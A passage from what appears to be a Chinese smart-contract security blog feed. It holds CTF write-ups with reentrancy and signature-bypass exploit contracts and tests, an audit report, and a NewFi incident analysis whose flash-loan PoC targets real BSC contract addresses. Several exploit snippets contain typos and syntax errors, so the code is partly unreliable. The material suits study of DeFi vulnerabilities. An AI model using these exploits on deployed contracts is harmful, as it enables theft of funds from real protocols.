ISwapRouter.ExactInputParams memory params =        ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);    SwapRouter.exactInput(params);&#125;function takeWETHFlashloanOnBalancer() internal &#123;    address[] memory tokens = new address[](1);    tokens[0] = address(WETH);    uint256[] memory amounts = new uint256[](1);    amounts[0] = 30e18;    Vault.flashLoan(address(this), tokens, amounts, bytes(&quot;&quot;));&#125;</code></pre><p>}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Numen-LenderPool</title>
      <link href="/2024/11/13/CTF-Numen-LenderPool/"/>
      <url>/2024/11/13/CTF-Numen-LenderPool/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Numen-LenderPool"><a href="#CTF-Numen-LenderPool" class="headerlink" title="CTF-Numen-LenderPool"></a>CTF-Numen-LenderPool</h1><p>题目有点长的，主要是接口使用多了<br>源代码<a href="https://github.com/minaminao/ctf-blockchain/blob/main/src/NumenCTF/LenderPool/challenge/Re.sol">点击</a></p><p>要求很明显：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">     if (token0.balanceOf(address(lenderPool)) == 0) &#123;</span><br><span class="line">         return true;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>耗尽池中所有的token0</p><p>关键就是在<code>flashLoan</code>函数中一个外部调用出现了问题：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">token0.transfer(borrower, borrowAmount);</span><br><span class="line">     borrower.functionCall(abi.encodeWithSignature(&quot;receiveEther(uint256)&quot;, borrowAmount));</span><br></pre></td></tr></table></figure><p>当发送给<code>borrower ``token0</code>时，会调用<code>borrower</code>的内部函数去接受，虽然flashLoan函数有防止重入的攻击的修饰，但是swap()函数没有防止重入攻击的修饰符，所以就可一进行一个&#x3D;跨函数的重入攻击。</p><p>所以这就是一个漏洞所在之处；</p><p>攻击思路：首先利用闪电贷借入token0;在闪电贷给攻击者转代币的时候，使用swap函数将token0转化为token1;造成假象已经进行还款了<br>最后直接再次调用swap函数，然后将token1换回token0,这样就无中生有消耗了池中的token0;</p><p>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^ 0.8.13;</span><br><span class="line"></span><br><span class="line">interface LenderPool&#123;</span><br><span class="line">    function swap(address tokenAddress, uint256 amount) exteranl returns(uint256);</span><br><span class="line">     function flashLoan(uint256 borrowAmount,address borrower) exteranl ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor (address _pool)&#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn () exteranl &#123;</span><br><span class="line">        pool.flashLoan(IERC20(pool.token0()).balanceOf(pool),address(this));</span><br><span class="line">        IERC20(address(pool.token1())).approve(address(pool));</span><br><span class="line">        pool.swap(address(pool.token0()),IERC20(pool.token(1()).balanceOf(address)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveEther(uint256 borrowAmount) exteranl&#123;</span><br><span class="line">        IERC20(address(pool.token0())).approve(address(pool))</span><br><span class="line">        pool.swap(address(pool.token1()),borrowAmount)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附加一个测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;./LenderPool.sol&quot;;</span><br><span class="line">import &quot;./Hack.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;</span><br><span class="line"></span><br><span class="line">contract LenderPooltest is test&#123;</span><br><span class="line">    Check public check;</span><br><span class="line">    Hack hack;</span><br><span class="line">    address hacker = makeAddr(&quot;hacker&quot;);</span><br><span class="line"></span><br><span class="line">    function setup() public&#123;</span><br><span class="line">        check = new check(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testhack() public&#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line"></span><br><span class="line">        hack = new hack();</span><br><span class="line">        hack.pwn();</span><br><span class="line"></span><br><span class="line">        assertTrue(check.isSolved());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体来说，就是这个交换没有防止重入的修饰，我们可以随意调用这个swap函数，然后就可以进行替换，完成题目。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-OnlyPwner-REVERSE RUGPULL</title>
      <link href="/2024/11/12/CTF-OnlyPwner-REVERSE-RUGPULL/"/>
      <url>/2024/11/12/CTF-OnlyPwner-REVERSE-RUGPULL/</url>
      
        <content type="html"><![CDATA[<p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract PrivilegeFinance &#123; </span><br><span class="line">    </span><br><span class="line">string public name = &quot;Privilege Finance&quot;;</span><br><span class="line">string public symbol = &quot;PF&quot;;</span><br><span class="line">uint256 public decimals = 18;</span><br><span class="line">uint256 public totalSupply = 200000000000;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; address) public referrers;</span><br><span class="line">    string msgsender = &#x27;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&#x27;;</span><br><span class="line">    uint public rewmax = 65000000000000000000000;</span><br><span class="line">    uint public time = 1677729607;</span><br><span class="line">    uint public Timeinterval = 600;</span><br><span class="line">    uint public Timewithdraw = 6000;</span><br><span class="line">    uint public Timeintervallimit = block.timestamp;</span><br><span class="line">    uint public Timewithdrawlimit = block.timestamp;</span><br><span class="line">    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;</span><br><span class="line">    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;</span><br><span class="line">    uint8 v = 28;</span><br><span class="line">    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;</span><br><span class="line">    uint public burnFees = 2;</span><br><span class="line">    uint public ReferrerFees = 8;</span><br><span class="line">    uint public transferRate = 10;</span><br><span class="line">    address public BurnAddr = 0x000000000000000000000000000000000000dEaD;</span><br><span class="line">bool public flag;</span><br><span class="line"></span><br><span class="line">constructor() public &#123;</span><br><span class="line">    balances[address(this)] = totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    function Airdrop() public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0 &amp;&amp; block.timestamp &gt;= Timeintervallimit,&quot;Collection time not reached&quot;);</span><br><span class="line">        balances[msg.sender] += 1000;</span><br><span class="line">        balances[address(this)] -= 1000;</span><br><span class="line">        Timeintervallimit += Timeinterval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address token, uint256 amount, address _ReferrerAddress) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;amount zero!&quot;);</span><br><span class="line">        if (msg.sender != address(0) &amp;&amp; _ReferrerAddress != address(0) &amp;&amp; msg.sender != _ReferrerAddress &amp;&amp; referrers[msg.sender] == address(0)) &#123;</span><br><span class="line">            referrers[msg.sender] = _ReferrerAddress;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[address(this)] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function withdraw(address token, uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0 &amp;&amp; block.timestamp &gt;= Timewithdrawlimit,&quot;Collection time not reached&quot;);</span><br><span class="line">        require(amount &gt; 0 &amp;&amp; amount &lt;= 2000,&quot;Financial restrictions&quot;);</span><br><span class="line">        Timewithdrawlimit += Timewithdraw;</span><br><span class="line">        require(amount &gt; 0, &quot;amount zero!&quot;);</span><br><span class="line">        balances[msg.sender] += amount;</span><br><span class="line">        balances[address(this)] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function DynamicRew(address _msgsender,uint _blocktimestamp,uint _ReferrerFees,uint _transferRate) public returns(address) &#123;</span><br><span class="line">        require(_blocktimestamp &lt; 1677729610, &quot;Time mismatch&quot;);</span><br><span class="line">        require(_transferRate &lt;= 50 &amp;&amp; _transferRate &lt;= 50);</span><br><span class="line">        bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));</span><br><span class="line">        address a = ecrecover(_hash, v, r, s);</span><br><span class="line">        require(a == admin &amp;&amp; time &lt; _blocktimestamp, &quot;time or banker&quot;);</span><br><span class="line">        ReferrerFees = _ReferrerFees;</span><br><span class="line">        transferRate = _transferRate;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient,uint256 amount) public &#123;</span><br><span class="line">        if(msg.sender == admin)&#123;</span><br><span class="line">            uint256 _fee = amount * transferRate / 100;</span><br><span class="line">            _transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);</span><br><span class="line">            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);</span><br><span class="line">            _transfer(address(this), recipient, amount * amount * transferRate);</span><br><span class="line">            amount = amount - _fee;</span><br><span class="line"></span><br><span class="line">        &#125;else if(recipient == admin)&#123;</span><br><span class="line">            uint256 _fee = amount * transferRate / 100;</span><br><span class="line">            _transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);</span><br><span class="line">            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);</span><br><span class="line">            amount = amount - _fee;</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">function _transfer(address from, address _to, uint _value) internal returns (bool) &#123;</span><br><span class="line">    balances[from] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setflag() public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt; 10000000)&#123;</span><br><span class="line">flag = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isSolved() public view returns(bool)&#123;</span><br><span class="line">    return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求也很简单；<code>balances[msg.sender] &gt; 10000000</code>;<br>首先看向这个的合约的时候，好像没有地方可以自由的转账的，<br>看了题解，是真的牛逼<br>原来一个地址错误了<code>string msgsender = &#39;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&#39;;</code>这个的地址是19字节的，不满足我们20字节的地址，所以这就是突破口，因为还差一个字节，二进制8位，实际就是从Ox00到Oxff只有256种可能,就可以直接暴力破解，用p语言来破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line"></span><br><span class="line">msgsender = &quot;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&quot;</span><br><span class="line"></span><br><span class="line">for i in range(256):</span><br><span class="line">hexDigits = &quot;&#123;:02x&#125;&quot;.format(i)</span><br><span class="line">checksummed = Web3.toChecksumAddress(msgsender + hexDigits)</span><br><span class="line">if (checksummed[:-2] == msgsender):</span><br><span class="line">print(checksummed)</span><br><span class="line"></span><br><span class="line"># python3 bruteForceChecksum.py </span><br><span class="line">0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053</span><br></pre></td></tr></table></figure><blockquote><p>我现在还没有学过p语言，所以这个代码就是网上的破解方法，另外说一下，不能用solidity破解，是因为会消耗大量的gas,也是根本行不通的</p></blockquote><p>找到正确的地址后，就直接可以调用<code>DynamicRew</code>函数,来修改 _ReferrerFees推荐人的费用，就是我们使用推荐人的余额来到达题目要求</p><p>这是测试合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/GOATFinance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract goatFinanceTest is Test &#123;</span><br><span class="line">    PrivilegeFinance public goatFi;</span><br><span class="line">    address owner = makeAddr(&quot;owner&quot;);</span><br><span class="line">    address hacker = makeAddr(&quot;hacker&quot;);</span><br><span class="line">    address hacker2 = makeAddr(&quot;hacker2&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.prank(owner);</span><br><span class="line">        goatFi = new PrivilegeFinance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttack() public &#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line">        </span><br><span class="line">        // get 1000 token to hacker from airdrop</span><br><span class="line">        goatFi.Airdrop();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Hacker balance :&quot;, goatFi.balances(hacker));</span><br><span class="line">        console.log(&quot;Hacker2 balance :&quot;, goatFi.balances(hacker2));</span><br><span class="line">        console.log(&quot;GOATFinance balance :&quot;, goatFi.balances(address(goatFi)));</span><br><span class="line">        </span><br><span class="line">        // set hacker&#x27;s referrer to hacker2</span><br><span class="line">        goatFi.deposit(address(0), 1, hacker2);</span><br><span class="line">        goatFi.DynamicRew(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, 1677729609, 1000000000, 50);</span><br><span class="line">        // transfer to admin, so referrer get fee from goatFi contract</span><br><span class="line">        goatFi.transfer(0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b, 999);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Hacker balance after :&quot;, goatFi.balances(hacker));</span><br><span class="line">        console.log(&quot;Hacker2 balance after :&quot;, goatFi.balances(hacker2));</span><br><span class="line">        console.log(&quot;GOATFinance balance after :&quot;, goatFi.balances(address(goatFi)));</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        vm.startPrank(hacker2);</span><br><span class="line">        </span><br><span class="line">        goatFi.setflag();</span><br><span class="line">        </span><br><span class="line">        assertTrue(goatFi.isSolved());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后它的输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># forge test --match-path test/GOATFinance.t.sol -vv</span><br><span class="line">[⠆] Compiling...</span><br><span class="line">No files changed, compilation skipped</span><br><span class="line"></span><br><span class="line">Running 1 test for test/GOATFinance.t.sol:goatFinanceTest</span><br><span class="line">[PASS] testAttack() (gas: 191636)</span><br><span class="line">Logs:</span><br><span class="line">  Hacker balance : 1000</span><br><span class="line">  Hacker2 balance : 0</span><br><span class="line">  GOATFinance balance : 199999999000</span><br><span class="line">  Hacker balance after : 480</span><br><span class="line">  Hacker2 balance after : 9980000000</span><br><span class="line">  GOATFinance balance after : 190019999001</span><br><span class="line"></span><br><span class="line">Test result: ok. 1 passed; 0 failed; finished in 1.51ms</span><br></pre></td></tr></table></figure><p>这个题第一次遇到，真的很值得学习，这种只要满足题目要求的调用者都可以。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-OnlyPwner-FREEBIE</title>
      <link href="/2024/11/11/CTF-OnlyPwner-FREEBIE/"/>
      <url>/2024/11/11/CTF-OnlyPwner-FREEBIE/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-OnlyPwner-FREEBIE"><a href="#CTF-OnlyPwner-FREEBIE" class="headerlink" title="CTF-OnlyPwner-FREEBIE"></a>CTF-OnlyPwner-FREEBIE</h1><p>题目地址 <a href="https://onlypwner.xyz/challenges/5">点击</a></p><p>要求是将合约的余额变为零</p><p>源代码很少</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.8.19;</span><br><span class="line"></span><br><span class="line">import &#123;IVault&#125; from &quot;./interfaces/IVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vault is IVault &#123;</span><br><span class="line">    uint256 public totalDeposited;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        totalDeposited += msg.value;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        totalDeposited -= amount;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是一个重入攻击</p><p>很简单，所以就直接写攻击合约了,就没有在remix上部署了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^0.8.19;</span><br><span class="line"></span><br><span class="line">interface Vault&#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw(uint256 amount ) exteranl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">   Vault target;</span><br><span class="line"></span><br><span class="line">    constructor (address _target)&#123;</span><br><span class="line">        target = Vault(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function pwn() external payable &#123;</span><br><span class="line">        target.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line"></span><br><span class="line">     if(balanceOf(address(Vault))&gt;balanceOf(address(this)))</span><br><span class="line">        target.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeHawks-GivingThanks审计报告</title>
      <link href="/2024/11/11/CodeHawks-GivingThanks%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/11/11/CodeHawks-GivingThanks%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The attacker can register their own address as the charitable organization and then perform a self-transfer by donating to the organization, effectively receiving a specific minted NFT for free.</p><h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>Vulnerability code source:<br><a href="https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L21-L23">https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L21-L23</a></p><p>There is no check to verify whether the charitable organization’s address is the same as the donor’s address, which allows attackers to mint specific NFTs for free. In other words, the registration requirements for a charitable organization are too lenient — only the admin’s approval is needed. This creates a situation where an attacker can effectively perform a self-transfer, resulting in the acquisition of more NFTs.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The attacker can disguise their own address as a charitable organization, obtain the admin’s confirmation, and then call the donate function, passing their own address as the charitable organization’s address. This allows the attacker to donate tokens and receive a specific NFT. If the attacker repeats the donation multiple times, it will lead to the minting of many NFTs, resulting in resource wastage and potentially the destruction of NFTs. If possible, the attacker may also sell the NFTs, gaining illegal profits.If this vulnerability is exploited by an attacker, it would undermine the reward mechanism for donors, allowing malicious individuals who haven’t donated to also receive specific NFTs.</p><h2 id="Tools-Used"><a href="#Tools-Used" class="headerlink" title="Tools Used"></a>Tools Used</h2><p>Manual review.</p><h2 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h2><p>Add a require condition to check if the charitable organization’s address is the same as the donor’s address. If they are the same, prevent the donation from being processed.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function donate(address charity) public payable &#123;</span><br><span class="line">        require(registry.isVerified(charity), &quot;Charity not verified&quot;);</span><br><span class="line"></span><br><span class="line">       require(msg.sender == charity,&quot;Not the correct charitable organization“）</span><br><span class="line"></span><br><span class="line">        (bool sent,) = charity.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, tokenCounter);</span><br><span class="line">//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>Anyone can modify the registry, leading to a shift in power, which could allow attackers to freely register charitable organizations.</p><h2 id="Vulnerability-Details-1"><a href="#Vulnerability-Details-1" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>The source of the vulnerability code:<br><a href="https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L56-L58">https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L56-L58</a></p><p>Detailed vulnerability code.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function updateRegistry(address _registry) public &#123;</span><br><span class="line">       registry = CharityRegistry(_registry);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>This function is public, meaning anyone can modify the registry. In other words, an attacker could register themselves as the registry and then provide the address of a charitable organization to register it. Only the admin is supposed to confirm the registration, but since the attacker has now become the admin, this creates a vulnerability that could be exploited for uncontrollable attacks.</p><h2 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h2><p>An attacker can call the <code>updateRegistry</code> public function, passing their own address as a parameter to change the registry. Then, by calling the donate function again, the attacker could either pass their own address or another address, allowing them to illegally receive donated tokens and engage in malicious fundraising.</p><h2 id="Tools-Used-1"><a href="#Tools-Used-1" class="headerlink" title="Tools Used"></a>Tools Used</h2><p>Manual review.</p><h2 id="Recommendations-1"><a href="#Recommendations-1" class="headerlink" title="Recommendations"></a>Recommendations</h2><p>Add a require condition in the<code>updateRegistry</code>function to restrict who can modify the registry.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function updateRegistry(address _registry) public &#123;</span><br><span class="line">      require(msg.sender == owner, &quot;NOT TURE ADMIN&quot;</span><br><span class="line">       registry = CharityRegistry(_registry);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="这次的报告，只有第一个被视为有效，还需要学习"><a href="#这次的报告，只有第一个被视为有效，还需要学习" class="headerlink" title="这次的报告，只有第一个被视为有效，还需要学习"></a>这次的报告，只有第一个被视为有效，还需要学习</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newfi攻击事件的分析</title>
      <link href="/2024/11/09/newfi%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/09/newfi%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>攻击介绍<br>2023年7月17日，bscscan链上的NewFi被黑客攻击，一共损失了价值31k$的BUSD。</p><p>攻击分析<br>我们使用phalcon进行分析，通过phalcon的调用栈分析，可以看到攻击者首先从4个池子贷了大量的BUSD，然后在PancakeSwap: Smart Router V3中通过以质押与回收BUSD从中套了31,099的BUSD。分析StakedV3.Invest()的调用栈，发现sqrtPriceX96从456917351256涨到了396517633895，显然攻击者通过StakedV3的Invest()方法操纵了价格。</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Vulnerable Contract : 0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411</span><br><span class="line">// Attack Tx : 0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5</span><br><span class="line"></span><br><span class="line">interface IStakedV3 &#123;</span><br><span class="line">    function Invest(</span><br><span class="line">        uint256 id,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        uint256 investType,</span><br><span class="line">        uint256 cycle,</span><br><span class="line">        uint256 deadline</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);</span><br><span class="line">    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">    Uni_Router_V3 Router = Uni_Router_V3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);</span><br><span class="line">    Uni_Pair_V3 Pair1 = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);</span><br><span class="line">    Uni_Pair_V3 Pair2 = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);</span><br><span class="line">    Uni_Pair_V3 Pair3 = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);</span><br><span class="line">    IStakedV3 StakedV3 = IStakedV3(0xB8dC09Eec82CaB2E86C7EdC8DD5882dd92d22411);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 30_043_573);</span><br><span class="line">        vm.label(address(BUSD), &quot;BUSD&quot;);</span><br><span class="line">        vm.label(address(USDT), &quot;USDT&quot;);</span><br><span class="line">        vm.label(address(Router), &quot;Router&quot;);</span><br><span class="line">        vm.label(address(Pair1), &quot;Pair1&quot;);</span><br><span class="line">        vm.label(address(Pair2), &quot;Pair2&quot;);</span><br><span class="line">        vm.label(address(StakedV3), &quot;StakedV3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        USDT.approve(address(Router), type(uint256).max);</span><br><span class="line">        BUSD.approve(address(Router), type(uint256).max);</span><br><span class="line">        BUSD.approve(address(StakedV3), type(uint256).max);</span><br><span class="line">        BUSD.approve(address(StakedV3), type(uint256).max);</span><br><span class="line">        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BUSD balance after exploit&quot;, BUSD.balanceOf(address(this)), BUSD.decimals()</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external &#123;</span><br><span class="line">        if (msg.sender == address(Pair1)) &#123;</span><br><span class="line">            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));</span><br><span class="line">            uint256 repayAmount = abi.decode(data, (uint256));</span><br><span class="line">            BUSD.transfer(address(Pair1), repayAmount + amount1);</span><br><span class="line">        &#125; else if (msg.sender == address(Pair2)) &#123;</span><br><span class="line">            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));</span><br><span class="line">            uint256 repayAmount = abi.decode(data, (uint256));</span><br><span class="line">            BUSD.transfer(address(Pair2), repayAmount + amount1);</span><br><span class="line">        &#125; else if (msg.sender == address(Pair3)) &#123;</span><br><span class="line">            BUSDToUSDT();</span><br><span class="line">            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT</span><br><span class="line">            USDTToBUSD();</span><br><span class="line">            uint256 repayAmount = abi.decode(data, (uint256));</span><br><span class="line">            BUSD.transfer(address(Pair3), repayAmount + amount1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function BUSDToUSDT() internal &#123;</span><br><span class="line">        bytes memory path = abi.encodePacked(address(BUSD), uint24(100), address(USDT));</span><br><span class="line">        address recipient = address(this);</span><br><span class="line">        uint256 amountIn = 12_000_000 ether;</span><br><span class="line">        uint256 amountOutMinimum = 0;</span><br><span class="line">        Uni_Router_V3.ExactInputParams memory ExactInputParams =</span><br><span class="line">            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);</span><br><span class="line">        Router.exactInput(ExactInputParams);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function USDTToBUSD() internal &#123;</span><br><span class="line">        bytes memory path = abi.encodePacked(address(USDT), uint24(100), address(BUSD));</span><br><span class="line">        address recipient = address(this);</span><br><span class="line">        uint256 amountIn = USDT.balanceOf(address(this));</span><br><span class="line">        uint256 amountOutMinimum = 0;</span><br><span class="line">        Uni_Router_V3.ExactInputParams 